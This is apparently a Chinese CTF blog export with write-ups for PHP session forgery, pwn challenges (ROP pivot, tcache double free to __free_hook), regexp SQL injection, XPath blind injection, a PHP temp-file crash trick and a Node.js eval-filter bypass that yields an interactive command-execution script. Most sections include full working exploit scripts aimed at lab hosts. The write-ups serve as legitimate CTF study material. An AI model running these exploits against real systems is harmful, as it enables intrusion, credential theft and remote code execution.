true;&#125;\n\n需要session为admin===true\nlib.php里们没找到什么可以修改session文件的函数，但是在export.php里面存在操作文件的东西\n&lt;?phprequire_once(&#x27;init.php&#x27;);if (!is_logged_in()) &#123;  redirect(&#x27;/?page=home&#x27;);&#125;$notes = get_notes();if (!isset($_GET[&#x27;type&#x27;]) || empty($_GET[&#x27;type&#x27;])) &#123;  $type = &#x27;zip&#x27;;&#125; else &#123;  $type = $_GET[&#x27;type&#x27;];&#125;$filename = get_user() . &#x27;-&#x27; . bin2hex(random_bytes(8)) . &#x27;.&#x27; . $type;$filename = str_replace(&#x27;..&#x27;, &#x27;&#x27;, $filename); // avoid path traversal$path = TEMP_DIR . &#x27;/&#x27; . $filename;if ($type === &#x27;tar&#x27;) &#123;  $archive = new PharData($path);  $archive-&gt;startBuffering();&#125; else &#123;  // use zip as default  $archive = new ZipArchive();  $archive-&gt;open($path, ZIPARCHIVE::CREATE | ZipArchive::OVERWRITE);&#125;for ($index = 0; $index &lt; count($notes); $index++) &#123;  $note = $notes[$index];  $title = $note[&#x27;title&#x27;];  $title = preg_replace(&#x27;/[^!-~]/&#x27;, &#x27;-&#x27;, $title);  $title = preg_replace(&#x27;#[/\\\\?*.]#&#x27;, &#x27;-&#x27;, $title); // delete suspicious characters  $archive-&gt;addFromString(&quot;&#123;$index&#125;_&#123;$title&#125;.json&quot;, json_encode($note));&#125;if ($type === &#x27;tar&#x27;) &#123;  $archive-&gt;stopBuffering();&#125; else &#123;  $archive-&gt;close();&#125;header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27; . $filename . &#x27;&quot;;&#x27;);header(&#x27;Content-Length: &#x27; . filesize($path));header(&#x27;Content-Type: application/zip&#x27;);readfile($path);\n\n利用过程以sess_ 登录，那么在export的filename当中，get_user()就会返回sess再将type=.因为下面的字符串替换就会把后面’.’给弄没了。\n网上的exp:\nimport reimport requestsURL = &#x27;http://2c84bf34-ac3c-4a8e-8f77-7868da243209.node4.buuoj.cn:81/&#x27;while True:    # login as sess_    sess = requests.Session()    sess.post(URL + &#x27;login.php&#x27;, data=&#123;        &#x27;user&#x27;: &#x27;sess_&#x27;    &#125;)    # make a crafted note    sess.post(URL + &#x27;add.php&#x27;, data=&#123;        &#x27;title&#x27;: &#x27;|N;admin|b:1;&#x27;,        &#x27;body&#x27;: &#x27;hello&#x27;    &#125;)    # make a fake session    r = sess.get(URL + &#x27;export.php?type=.&#x27;).headers[&#x27;Content-Disposition&#x27;]    print(r)    sessid = re.findall(r&#x27;sess_([0-9a-z-]+)&#x27;, r)[0]    print(sessid)    # get the flag    r = requests.get(URL + &#x27;?page=flag&#x27;, cookies=&#123;        &#x27;PHPSESSID&#x27;: sessid    &#125;).content.decode(&#x27;utf-8&#x27;)    flag = re.findall(r&#x27;flag\\&#123;.+\\&#125;&#x27;, r)    if len(flag) &gt; 0:        print(flag[0])        break\n\n","categories":["web-buuctf"],"tags":["session伪造"]},{"title":"MT-CTF2021复现","url":"/2021/12/14/MT-CTF/","content":"比赛当天给我哥过生日去了，没时间打比赛，下来复现比赛发现三道pwn题的难度都不是很难，除了最后一道，还没想到预期解，只能跟着wp做一遍非预期解\nbabyrop预备知识栈迁移\n流程分析程序的流程比较简单，首先存在一个字节的溢出，可以查看canary。然后让你比较password的地址，就可以进入漏洞函数。但是漏洞函数只存在八个字节的溢出\n利用分析因为我们只能溢出一个所以直接构造ROP是行不通的，所以考虑把ROP写到bss上面，直接放exp吧。\nexpfrom pwn import *elf = ELF(&#x27;./babyrop&#x27;)libc = ELF(&#x27;./libc-2.27.so&#x27;)r = process(&#x27;./babyrop&#x27;)context.log_level = &#x27;debug&#x27;# context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]main_addr = elf.symbols[&#x27;main&#x27;]pop_rdi_ret = 0x0000000000400913ret_addr = 0x0000000000400284puts_got_addr = elf.got[&#x27;puts&#x27;]puts_plt_addr = elf.plt[&#x27;puts&#x27;]fake_stack = elf.bss()+0x320vuln_addr = 0x40072Cr.recvuntil(b&#x27;What your name? &#x27;)r.sendline(b&#x27;a&#x27;*(0x20-0x8+1))# gdb.attach(r)print(r.recvuntil(b&#x27;a&#x27;*(0x20-0x8+1)))# canary = (b&#x27;\\x00&#x27;+r.recvuntil(b&#x27;, welcome to this challenge!\\n&#x27;))canary = u64(b&#x27;\\x00&#x27;+r.recv(7))print(hex(canary))# print(u64(r.recvuntil(b&#x27;, welcome to this challenge!\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;)))r.recvuntil(b&#x27;Please input the passwd to unlock this challenge&#x27;)r.sendline(b&#x27;4196782&#x27;)payload = b&#x27;a&#x27;*(0x20-0x8)+p64(canary)+p64(fake_stack)+p64(vuln_addr)r.recvuntil(b&#x27;OK!\\nNow, you can input your message&#x27;)r.sendline(payload)payload = p64(puts_got_addr)+p64(puts_plt_addr)+p64(vuln_addr) + \\    p64(canary)+p64(fake_stack-0x30)+p64(vuln_addr)r.send(payload)# gdb.attach(r)payload = b&#x27;a&#x27;*(0x20-0x8)+p64(canary)+p64(fake_stack-0x20)+p64(pop_rdi_ret)r.send(payload)puts_addr = u64(p.recv(6).ljust(8, &#x27;\\x00&#x27;))libc_base = puts_addr-libc.symbols[&#x27;puts&#x27;]one_gadget = libc_base+0x4f3d5payload = b&#x27;a&#x27;*0x18+p64(canary)+p64(0)+p64(one_gadget)r.send(payload)r.interactive()\n\nbook_shop流程分析题目创建chunk的大小是固定的，并且libc的版本存在tcache，并且只有create存在写入内存的功能\n利用分析首先创建十一个大小为fastbin以内的chunk，释放7个chunk占满tcache，随后释放两个连续的chunk进入fastbin，然后触发malloc_consolidate使fastbin里的chunk合并进入unsortedbin，众所周知，unsortedbin只有一个chunk时，他的fd和bk都指向了main_arena，又因为存在UAF所以直接可以泄漏出libc的加载地址。然后再利用double free释放两个chunk进入fastbin，此时create七个chunk将tcache腾空，那么fastbin的chunk会进入tcache，接着利用double free修改tcache最后那个chunk的fd指针到__free_hook，因为tcache对于安全检测几乎没有就可以直接篡改掉__free_hook然后getshell。下面放出exp\nexpfrom pwn import *r = process(&#x27;./bookshop&#x27;)elf = ELF(&#x27;./bookshop&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)r.recvuntil(b&#x27;The lucky number?\\n&#x27;)r.sendline(bytes(str(0x68), encoding=&#x27;utf8&#x27;))def create(content):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;&gt; &#x27;)    r.send(content)def show(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Which Book do you want to read?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def delete(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Which Book do you want to take out from you bag?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))for i in range(11):    create(b&#x27;a&#x27;)for i in range(7):    delete(6-i)delete(7)delete(8)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;0&#x27;*0x400)show(7)r.recvuntil(b&#x27;Content: &#x27;)main_arena = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena))main_arena = main_arena-304print(hex(main_arena))# print(u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)))libc_base = main_arena-(next(libc.search(b&#x27;main_arena&#x27;))+0x3365f)print(hex(libc_base))delete(10)delete(8)delete(10)for i in range(7):    create(b&#x27;a&#x27;)free_hook = libc_base+libc.symbols[&#x27;__free_hook&#x27;]print(hex(free_hook))create(p64(free_hook-8))create(p64(0))system_addr = libc_base+libc.symbols[&#x27;system&#x27;]create(b&#x27;/bin/sh\\x00&#x27;+p64(system_addr))create(b&#x27;/bin/sh\\x00&#x27;+p64(system_addr))delete(20)# gdb.attach(r)r.interactive()\n\nblind_box流程分析这道题目的libc版本依旧存在tcache，但是题目已经给了后门函数，非预期解就是在show函数的检测只检测了libc为0x7f的情况，但是libc存在0x7e所以直接可以泄漏出libc地址，非预期解很简单，但是预期解我下去再想想。\nexpfrom pwn import *from ctypes import cdllelf = ELF(&#x27;./Blindbox&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)r = process(&#x27;./Blindbox&#x27;)context.log_level = &#x27;debug&#x27;r.recvuntil(b&#x27;Please tell me your name:&#x27;)r.sendline(b&#x27;196082&#x27;)r.recvuntil(b&#x27;The first lucky number?&#x27;)r.sendline(bytes(str(0x100), encoding=&#x27;utf8&#x27;))r.recvuntil(b&#x27;The second lucky number?&#x27;)r.sendline(bytes(str(0x100), encoding=&#x27;utf8&#x27;))r.recvuntil(b&#x27;The third lucky number?&#x27;)r.sendline(bytes(str(0x100), encoding=&#x27;utf8&#x27;))def create(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Give index for this Blindbox(1-3): &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def drop(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Which index do you want to drop?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def show(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Which Blindbox do you want to open?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))for i in range(7):    create(1)    drop(1)create(1)create(2)drop(1)gdb.attach(r)show(1)r.recvuntil(b&#x27;Content of this Blindbox: &#x27;)main_arena = u64(r.recv(6).ljust(8, &#x27;\\x00&#x27;))-96libc_base = main_arena-next(libc.search(b&#x27;main_arena&#x27;))system_addr = libc_base+libc.symbols[&#x27;system&#x27;]objdll = cdll.LoadLibrary(&#x27;./libc-2.31.so&#x27;)objdll.srand(0)for i in range(7):    r.recvuntil(b&quot;Round &quot;+bytes(str(i), encoding=&#x27;utf8&#x27;)+b&quot; Please guess&gt;&quot;)    res = system_addr ^ objdll.rand()    r.sendline(bytes(str(res), encoding=&#x27;utf8&#x27;))r.interactive()\n\n","categories":["比赛复现"],"tags":["pwn"]},{"title":"NCTF2019_SQLi","url":"/2021/09/19/NCTF2019-SQLi/","content":"收集信息看了一下浏览器开发者工具没什么提示什么的\n\n那就直接上dirsearch\n\n看见robots.txt直接进，里面提示有hint.txt然后查看\n内容是\n$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\\&#x27;|=| |in|&lt;|&gt;|-|\\.|\\(\\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,Then you will get the flag;\n\n这下就很明了了，他*的把贼多东西都禁用了。\n可以看到是php5.2.16。这下好办了。\n构造payload因为他已经给了我们sql语句了，那我们直接开始构造\nselect * from users where username=&#x27;&#x27; and passwd=&#x27;&#x27;闭合引号select * from users where username=&#x27;\\&#x27; and passwd=&#x27;%00&#x27;因为是php5.2.16的缘故可以用00截断，这样使引号闭合了，再就是用什么方式攻击呢？其实我也不知道，我看了一下wp知道了用regexp正则攻击\n\n所以就有了payload:\nselect * from users where username=&#x27;\\&#x27; and passwd=&#x27;||passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;%00&#x27;\n\n不多废话了直接上exp了\nimport requestsimport urllibimport timeimport stringurl = &#x27;http://2beea7c9-88b6-4eaf-90af-be42303386ff.node4.buuoj.cn/index.php&#x27;payload = &#x27;||passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;flag = &#x27;&#x27;string = string.ascii_lowercase+string.digits+&#x27;_&#x27;for j in range(50):    for i in string:        data = &#123;            &#x27;username&#x27;: &#x27;\\\\&#x27;,            &#x27;passwd&#x27;: payload.format(flag+i, urllib.parse.unquote(&#x27;%00&#x27;)) # 这里是防止%00被url编码了        &#125;        print(data[&#x27;passwd&#x27;])        time.sleep(0.1)        res = requests.post(url=url, data=data).text        # print(res)        if &#x27;welcome&#x27; in res:            flag += i            print(flag)            print(res)            break\n\n爆出密码不用admin帐户名直接登陆就可以拿到flag了。\n","categories":["web-buuctf"],"tags":["web","sql"]},{"title":"NPUCTF2020_ezinclude","url":"/2021/09/21/NPUCTF2020-ezinclude/","content":"\n发现思路并不清晰，就开始扫他丫的东方明珠塔。\n\n扫了仨文件出来，访问之后发现dir显示的应该是某个空目录。\n\n然后看看index的数据包，发现hash那里很长很想md5的结果，拿去py看了一下确实是32位，就尝试?pass=fa25e…上面那个。\n\n跳转到这个页面，然后我在浏览器试了很久都打不开，结果是我傻逼了，继续用burpsuite。出来让我包含文件，读取了所有文件没找到flag但是dir.php的内容其实是 print_r(scandir(‘/tmp’))。然后这里就开始打算些session条件竞争了。\n但是这个题目的预期解是利用php程序崩溃不删除临时文件然后拿到flag。\nphp://filter/string.strip_tags\n使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。\n该方法仅适用于以下php7版本，php5并不存在该崩溃：\n• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复\n\nconvert.quoted-printable-encode\n这个崩溃并不适用于include，require等函数，适用于file函数，file_get_contents函数，readfile函数\n• php7.0.0-7.0.32• php7.0.4-7.2.12• php&lt;=5.6.38的版本\n\n5.6.39-5.6.9以内的版本并不存在这个崩溃\n放出最后的exp\nimport requestspayload = b&#x27;&lt;?php phpinfo();?&gt;&#x27;file = &#123;    &#x27;file&#x27;: (&#x27;back&#x27;, payload)&#125;url = &#x27;http://bfd565e1-b0f5-4857-89f7-ebd8088c4357.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;res = requests.post(url=url, files=file)print(res.text)\n\n上方知识点师傅链接:https://www.cnblogs.com/tr1ple/p/11301743.html\n","categories":["web-buuctf"],"tags":["文件包含","php冷门知识"]},{"title":"NPUCTF2020_ezlogin","url":"/2021/10/19/NPUCTF2020-ezlogin/","content":"近期刷题感觉全是不会的，烦躁的要死，后面静下心来好好刷了。\nXpath基础语法:https://xz.aliyun.com/t/7791#toc-6\n了解玩Xpath基础语法之后就直接开始构造payload吧，先来个\n&lt;username&gt;&#x27;or 1=1 or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;3f2ea0aa5c07e1b6dbTYzNDYyNjM1Ny4&lt;/token&gt;\n\n发现弹出非法操作!然后试了很多都是，被过滤的脑壳痛去看了wp，然而事实是，弹出非法操作!就是执行结果为true。还有一点恶心的就是题目需要上传的token换得是真的快，加上又是盲注可以直接开始写脚本了。\nimport requestsimport reimport timeurl = &#x27;http://bb300bbc-590d-4a1f-8768-b659cc0efca2.node4.buuoj.cn:81/&#x27;session = requests.session()headers = &#123;    &#x27;Content-Type&#x27;: &#x27;application/xml&#x27;&#125;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/*[1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/root/*[1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/root/accounts/*[1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/root/accounts/user/*[1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/root/accounts/user/*[2]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/root/accounts/user/*[3]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(/root/accounts/user[1]/username/text(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(/root/accounts/user[1]/password/text(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(/root/accounts/user[2]/username/text(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;payload = &quot;&lt;username&gt;&#x27; or substring(/root/accounts/user[2]/password/text(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;flag = &#x27;&#x27;for i in range(1, 50):    flag_length = len(flag)    for j in range(27, 128):        res = session.get(url).text        token = re.findall(            r&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*)&quot; /&gt;&#x27;, res)[0]        time.sleep(0.25)        print(payload.format(str(i), chr(j), token))        res = session.post(url, data=payload.format(            str(i), chr(j), token), headers=headers).text        if &#x27;非法操作!&#x27; in res:            flag += chr(j)            print(flag)            break    if flag_length == len(flag):        breakprint(flag)# adm1n  cf7414b5bdb2e65ee43083f4ddbc4d9f\n\n可以看见密码是md5加密的，解密一下就好，然后进入之后就是一个文件包含，但是又被过滤了，我也是在wp看到的payload\n?file=phP://filter/read=convert.bAse64-encode/resource=/flag\n\n\n","categories":["web-buuctf"],"tags":["Xpath注入"]},{"title":"NPUCTF2020_验证码","url":"/2021/11/30/NPUCTF2020-%E9%AA%8C%E8%AF%81%E7%A0%81/","content":"题目源代码const express = require(&#x27;express&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);const cookieSession = require(&#x27;cookie-session&#x27;);const fs = require(&#x27;fs&#x27;);const crypto = require(&#x27;crypto&#x27;);const keys = require(&#x27;./key.js&#x27;).keys;function md5(s) &#123;    return crypto.createHash(&#x27;md5&#x27;)        .update(s)        .digest(&#x27;hex&#x27;);&#125;function saferEval(str) &#123;    if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, &#x27;&#x27;)) &#123;        return null;    &#125;    return eval(str);&#125; // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个const template = fs.readFileSync(&#x27;./index.html&#x27;).toString();function render(results) &#123;    return template.replace(&#x27;&#123;&#123;results&#125;&#125;&#x27;, results.join(&#x27;&lt;br/&gt;&#x27;));&#125;const app = express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());app.use(cookieSession(&#123;    name: &#x27;PHPSESSION&#x27;, // 2020.3/WORKER2 嘿嘿，给爷爪⑧    keys&#125;));Object.freeze(Object);Object.freeze(Math);app.post(&#x27;/&#x27;, function (req, res) &#123;    let result = &#x27;&#x27;;    const results = req.session.results || [];    const &#123; e, first, second &#125; = req.body;    if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first !== second &amp;&amp; md5(first + keys[0]) === md5(second + keys[0])) \t &#123;        if (req.body.e) &#123;            try &#123;                result = saferEval(req.body.e) || &#x27;Wrong Wrong Wrong!!!&#x27;;            &#125; catch (e) &#123;                console.log(e);                result = &#x27;Wrong Wrong Wrong!!!&#x27;;            &#125;            results.unshift(`$&#123;req.body.e&#125;=$&#123;result&#125;`);        &#125;    &#125; else &#123;        results.unshift(&#x27;Not verified!&#x27;);    &#125;    if (results.length &gt; 13) &#123;        results.pop();    &#125;    req.session.results = results;    res.send(render(req.session.results));&#125;);// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPIapp.get(&#x27;/source&#x27;, function (req, res) &#123;    res.set(&#x27;Content-Type&#x27;, &#x27;text/javascript;charset=utf-8&#x27;);    res.send(fs.readFileSync(&#x27;./index.js&#x27;));&#125;);app.get(&#x27;/&#x27;, function (req, res) &#123;    res.set(&#x27;Content-Type&#x27;, &#x27;text/html;charset=utf-8&#x27;);    req.session.admin = req.session.admin || 0;    res.send(render(req.session.results = req.session.results || []))&#125;);app.listen(80, &#x27;0.0.0.0&#x27;, () =&gt; &#123;    console.log(&#x27;Start listening&#x27;)&#125;);\n\n流程分析可以看到我们post几个数据然后这里有一个比较\nif (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first !== second &amp;&amp; md5(first + keys[0]) === md5(second + keys[0])) \n\n绕过的方式也很简单\n在js当中无论是数组还是对象和字符串相加最终都是字符串，所以我们只需要上传数组就够了哈。\nif (req.body.e) &#123;    try &#123;        result = saferEval(req.body.e) || &#x27;Wrong Wrong Wrong!!!&#x27;;    &#125; catch (e) &#123;        console.log(e);        result = &#x27;Wrong Wrong Wrong!!!&#x27;;    &#125;    results.unshift(`$&#123;req.body.e&#125;=$&#123;result&#125;`);&#125;\n\n紧接着就会执行这个\nfunction saferEval(str) &#123;    if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, &#x27;&#x27;)) &#123;        return null;    &#125;    return eval(str);&#125;\n\n我们要匹配这个正则才能进行绕过，可以看到正则被分为了三段，第一段匹配的是Math.xxxxxxxx什么的，第二段是 ()+-*/&amp;|^%&lt;&gt;=,?: ，第三段是数字或则e1111都可以。\n利用思路就是构造出函数执行我们需要的就行\n\n后面必须用数字的我们用fromCharCode来绕过\nexpimport requestsimport jsonimport reurl = &#x27;http://51c7300e-c91d-44f8-92f8-d86efe685497.node4.buuoj.cn:81/&#x27;header = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;while True:    rce = input(&#x27;&gt;&gt;&gt;&#x27;)    if rce == &#x27;quit&#x27;:        break    content = &#x27;&#x27;    rce = &quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;&quot; + \\        rce+&quot;&#x27;).toString()&quot;    for each in rce:        content += str(ord(each))        content += &#x27;,&#x27;    content = content[:-1]    data = &#123;        &quot;first&quot;: [1],        &quot;second&quot;: &quot;1&quot;,        &quot;e&quot;: &quot;((Math)=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(&#123;&#125;))()))(Math+2)&quot;.format(content)    &#125;    res = requests.post(url=url, data=json.dumps(data), headers=header).text    res = re.findall(&#x27;&lt;div id=&quot;res&quot;&gt;\\n(.*)&#x27;, res)    print(res[0].lstrip())\n\n","categories":["web-buuctf"],"tags":["js"]},{"title":"RCTF2021复现","url":"/2022/04/10/RCTF2021%E5%A4%8D%E7%8E%B0/","content":"以前做pwn题比较在意的是利用方式以及利用原理，很少静下心来去逆向一个程序，也就导致我现在逆向能力相对来说很差，在遇到RCTF这种题目极其复杂的内容我可能就直接放弃了，然后比赛完就看别人wp，别人说了流程之后我就会想，这么简单我为什么当时不做呢？所以现在打算多多练题训练自己的逆向能力。\nPokemon流程分析main函数存在三个选项，第一就是创建chunk，创建的方式分为三种\nstruct chunk(Gold 3)0x1D0:&#123;\t888~908\t400~420&#125;struct chunk(Silver 2)0x210:&#123;\t666~676\t200~210&#125;struct chunk(Bronze 1)0x7f~0x380:&#123;\t23~23+(size/16)\tchunk_addr\tpasswd&#125;\n\n这是我推测出来的三个结构体。\n第二个选项就是对chunk进行一些行为，又分为三个，第一是释放chunk但是只允许类型为1的chunk被释放，第二个是show但是有一定的限制\nif ( memchr((a1 + 16), 0x7F, 8uLL)    || memchr((a1 + 16), 0x7E, 8uLL)    || strchr((a1 + 16), 0x55)    || strchr((a1 + 16), 0x56) )\n\n第三个选项就是修改内容，但是只可以修改一次并且类型1不能修改，类型2每个0x10才能修改，但是存在堆溢出，类型3可以修改0x10之后的内容大小为0x20\n然后就是main当中的第三个选项，这里首先就是比较你的两个chunk的值与Mewtwo作比较\nstruct Mewtwo:&#123;\t99999999\t6666666&#125;\n\n如果小于则会直接推出，如果大于就会进入下面\n__int64 __fastcall sub_3892(__int64 a1)&#123;  int i; // [rsp+14h] [rbp-Ch]  for ( i = 0; ; ++i )  &#123;    if ( i &gt; 1 )      return 0LL;    if ( *(a1 + 4 * (i + 16LL) + 8) == 1 &amp;&amp; *(*(a1 + 8 * (i + 6LL) + 8) + 0x10LL) )      break;  &#125;  if ( !dword_81F8 )  &#123;    printf(&quot;Please remember the password of the evolutionary gem: &quot;);    write(1, (*(a1 + 8 * (i + 6LL) + 8) + 0x10LL), 8uLL);    write(1, &quot;\\n&quot;, 1uLL);    dword_81F8 = 1;  &#125;  return 1LL;&#125;\n\n没有限制条件的write\nssize_t __fastcall sub_396E(__int64 a1)&#123;  ssize_t result; // rax  int i; // [rsp+10h] [rbp-10h]  int j; // [rsp+14h] [rbp-Ch]  for ( i = 0; i &lt;= 1; ++i )  &#123;    result = *(a1 + 4 * (i + 16LL) + 8);    if ( result == 1 )    &#123;      result = *(*(a1 + 8 * (i + 6LL) + 8) + 16LL);      if ( result )      &#123;        printf(&quot;Please give the evolution password: &quot;);        result = read(0, *(*(a1 + 8 * (i + 6LL) + 8) + 0x18LL), 0x30uLL);        for ( j = 0; j &lt;= 0x2F; ++j )        &#123;          result = *(*(a1 + 8 * (i + 6LL) + 8) + 0x18LL) + j;          *result ^= *(*(a1 + 8 * (i + 6LL) + 8) + j % 8 + 0x10LL);        &#125;        return result;      &#125;    &#125;  &#125;  return result;&#125;\n\n以及一个写入，这个写入是往chunk的0x18上的地址的值来写入。\n然后这里的free是存在一个小东西，就是如果chunk的0x10位置和0x18位置存在值就会free掉0x18位置的值。\n然后这里把游戏角色的结构体贴出来\nstruct role:&#123;\t\tname;0x20\t*(chunk+8)+=1000;0x28\t*(chunk)+=0;0x30\tremaining=1666;0x34\tcount;0x38\tchunk;0x48\texists/category;&#125;\n\n利用分析其实这道题就算是逆向完了也有点儿难想到利用方式，这里很烦的一点就是我们可以控制的内容太少了，但是由于题目给的read的地方都不能修改掉fd和bk那就肯定是存在overlapping，加上存在堆溢出可以很容易想到改变堆的大小，形成UAF。\n然后这里需要注意的一点就是当malloc的size大于small bin中的size且小于small bin当中的size+0x10就不会进行切块\n但是我觉得这应该不只是small bin当中的机制(我看源码只看了small bin的request所以其他的我也不确定)，后面有时间会试试在unsorted bin和large bin中是否成立。\n其实知道了这个知识点就很好利用了，因为如果按照固定思维的我们堆溢出无法修改掉size位，但是如果存在以上机制我们即可利用0x220来修改掉后面chunk的size了。\n综上，expfrom pwn import *r = process(&#x27;./Pokemon&#x27;)elf = ELF(&#x27;./Pokemon&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)def create(category, size=0, idx=0):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(bytes(str(category), encoding=&#x27;utf8&#x27;))    if category == 1:        r.recvuntil(b&#x27;You will get a Pikachu. How big do you want it to be?&#x27;)        r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;]&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def delete(idx, need=False):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;]&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;1&#x27;)    if need:        r.recvuntil(            b&#x27;This Pokemon is very valuable. Are you sure you want to release it? [Y/N]&#x27;        )        r.sendline(b&#x27;Y&#x27;)def edit(idx, content):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;]&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;You say: &#x27;)    r.send(content)def xor(payload, key):    res = &#x27;&#x27;    for i in range(len(payload)):    